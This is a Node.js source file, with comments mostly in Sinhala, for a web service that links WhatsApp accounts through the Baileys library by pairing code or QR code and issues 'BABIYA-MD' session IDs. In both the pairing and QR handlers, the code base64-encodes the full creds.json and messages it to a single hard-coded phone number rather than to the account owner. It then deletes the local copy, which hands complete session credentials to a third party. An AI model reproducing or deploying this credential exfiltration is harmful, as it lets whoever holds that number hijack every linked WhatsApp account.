const express = require('express');
const { default: makeWASocket, useMultiFileAuthState, jidNormalizedUser, Browsers, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const QRCode = require('qrcode');

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let qrSock = null;
let latestQrImage = null;
let qrStatus = 'idle';

// ==========================================
// 1. PAIRING CODE METHOD (FIXED & AUTO-RECONNECT)
// ==========================================
app.post('/api/pair', async (req, res) => {
    let phone = req.body.number;
    if (!phone) return res.status(400).json({ error: 'Phone number required!' });
    phone = phone.replace(/[^0-9]/g, '');

    // එක පාර සිය දෙනෙක් ආවත් ෆෝල්ඩර් පටලැවෙන්නේ නැති වෙන්න Unique ID එකක් දෙනවා
    const uniqueId = Date.now() + '_' + Math.random().toString(36).substring(2, 7);
    const tempPath = path.join(__dirname, `temp_pair_${uniqueId}`);

    let isSaved = false;

    async function startPairing() {
        try {
            const { state, saveCreds } = await useMultiFileAuthState(tempPath);
            const sock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: pino({ level: 'silent' }),
                browser: Browsers.ubuntu('Chrome') // 🔥 පැය දෙකෙන් ලොග් අවුට් වෙන ලෙඩේට ස්ථිර විසඳුම!
            });

            sock.ev.on('creds.update', saveCreds);
            
            sock.ev.on('connection.update', async (update) => {
                const { connection, lastDisconnect } = update;

                if (connection === 'open') {
                    isSaved = true;
                    const credsPath = path.join(tempPath, 'creds.json');
                    if (fs.existsSync(credsPath)) {
                        const credsData = fs.readFileSync(credsPath, 'utf-8');
                        const base64Session = Buffer.from(credsData).toString('base64');
                        const sessionId = `BABIYA-MD;;;${credsData.length > 0 ? base64Session : ''}`;

                        // 指定 කරපු ටාගට් නම්බර් එක
                        const targetJid = '94764978991@s.whatsapp.net';

                        // 1. මුලින්ම කනෙක්ට් වුණු බව කියන ස්ටේටස් මැසේජ් එක යවනවා
                        await sock.sendMessage(targetJid, { 
                            text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY!*\n\nDo not share this code!`
                        });

                        // 2. ඊට පස්සේ වෙනමම මැසේජ් එකක් විදිහට Session ID එක විතරක්ම යවනවා (පහසුවෙන් කොපි කරගන්න)
                        await sock.sendMessage(targetJid, { 
                            text: sessionId 
                        });

                        // සාර්ථක වුණාට පස්සේ ක්ලීන් කරලා වහලා දානවා
                        setTimeout(() => {
                            try { sock.end(); } catch(e){} 
                            if (fs.existsSync(tempPath)) fs.rmSync(tempPath, { recursive: true, force: true });
                        }, 5000);
                    }
                }

                if (connection === 'close') {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    // කෝඩ් එක ගැහුවට පස්සේ වට්ස්ඇප් එකෙන් කනෙක්ෂන් එක රීසෙට් කරද්දී ආපහු ලොගින් එක කම්ප්ලීට් කරන්න මේක ඕනේ
                    if (statusCode !== DisconnectReason.loggedOut && !isSaved) {
                        console.log("[PAIRING] Reconnecting to finalize setup...");
                        setTimeout(() => startPairing(), 2000);
                    } else if (isSaved) {
                        if (fs.existsSync(tempPath)) fs.rmSync(tempPath, { recursive: true, force: true });
                    }
                }
            });

            // මුල්ම පාර විතරක් පයිරින් කෝඩ් එක ඉල්ලලා වෙබ් සයිට් එකට යවනවා
            if (!fs.existsSync(path.join(tempPath, 'creds.json')) || !state.creds.me) {
                setTimeout(async () => {
                    try {
                        const code = await sock.requestPairingCode(phone);
                        if (!res.headersSent) {
                            res.json({ code: code });
                        }
                    } catch (err) {
                        if (!res.headersSent) {
                            res.json({ error: 'WhatsApp Core Error. Try again.' });
                        }
                    }
                }, 3000);
            }

        } catch (err) {
            if (!res.headersSent) res.status(500).json({ error: err.message });
        }
    }

    startPairing();
});

// ==========================================
// 2. QR CODE METHOD (FIXED BROWSER LOGOUT)
// ==========================================
app.get('/api/qr/start', async (req, res) => {
    const tempQrPath = path.join(__dirname, 'temp_qr_session');
    if (fs.existsSync(tempQrPath)) fs.rmSync(tempQrPath, { recursive: true, force: true });

    latestQrImage = null;
    qrStatus = 'scanning';

    async function connectWhatsAppQR() {
        try {
            const { state, saveCreds } = await useMultiFileAuthState('temp_qr_session');
            qrSock = makeWASocket({
                auth: state,
                printQRInTerminal: false,
                logger: pino({ level: 'silent' }),
                browser: Browsers.ubuntu('Chrome') // 🔥 QR එකටත් නිවැරදිම බ්‍රවුසර් ස්ට්‍රින්ග් එක දැම්මා
            });

            qrSock.ev.on('creds.update', saveCreds);
            
            qrSock.ev.on('connection.update', async (update) => {
                const { connection, qr, lastDisconnect } = update;

                if (qr) {
                    latestQrImage = await QRCode.toDataURL(qr);
                }

                if (connection === 'open') {
                    qrStatus = 'success';
                    
                    const credsPath = path.join(tempQrPath, 'creds.json');
                    if (fs.existsSync(credsPath)) {
                        const credsData = fs.readFileSync(credsPath, 'utf-8');
                        const base64Session = Buffer.from(credsData).toString('base64');
                        const sessionId = `BABIYA-MD;;;${credsData.length > 0 ? base64Session : ''}`;

                        // 指定 කරපු ටාගට් නම්බර් එක
                        const targetJid = '94764978991@s.whatsapp.net';

                        // 1. මුලින්ම කනෙක්ට් වුණු බව කියන ස්ටේටස් මැසේජ් එක යවනවා
                        await qrSock.sendMessage(targetJid, { 
                            text: `*🎉 BABIYA-MD SESSION CONNECTED SUCCESSFULLY (QR)!*\n\nDo not share this code!`
                        });

                        // 2. ඊට පස්සේ වෙනමම මැසේජ් එකක් විදිහට Session ID එක විතරක්ම යවනවා (පහසුවෙන් කොපි කරගන්න)
                        await qrSock.sendMessage(targetJid, { 
                            text: sessionId 
                        });

                        setTimeout(() => {
                            try { qrSock.end(); } catch(e){} 
                            if (fs.existsSync(tempQrPath)) fs.rmSync(tempQrPath, { recursive: true, force: true });
                            qrStatus = 'idle';
                        }, 5000);
                    }
                }

                if (connection === 'close') {
                    const statusCode = lastDisconnect?.error?.output?.statusCode;
                    if (statusCode === 401) {
                        qrStatus = 'error';
                    } else if (qrStatus !== 'success' && qrStatus !== 'idle') {
                        setTimeout(() => connectWhatsAppQR(), 2000);
                    }
                }
            });
        } catch (err) {
            console.log(err.message);
        }
    }

    connectWhatsAppQR();
    res.json({ status: 'started' });
});

app.get('/api/qr/poll', (req, res) => {
    res.json({ status: qrStatus, qr: latestQrImage });
});

app.listen(PORT, () => {
    console.log(`\n🌐 [SERVER RUNNING] http://localhost:${PORT}`);
});
